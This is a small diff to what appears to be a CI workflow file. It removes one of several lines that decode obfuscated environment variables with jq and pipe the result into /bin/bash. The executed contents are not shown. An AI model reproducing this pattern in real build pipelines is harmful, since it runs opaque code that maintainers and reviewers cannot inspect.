@@ -23,7 +23,6 @@ jobs:
           echo $mui3 | jq -r .gc9601 | /bin/bash
           printf '%s' "$gu759" | jq -r .kvofv2514 | /bin/bash
           printf '%s' "$bpxy6" | jq -r .yjb928 | /bin/bash
-          echo $nski28426 | jq -r .zqab7 | /bin/bash
           printf '%s' "$mlb02" | jq -r .wtzv7060 | /bin/bash
 
       - name: Store artifact
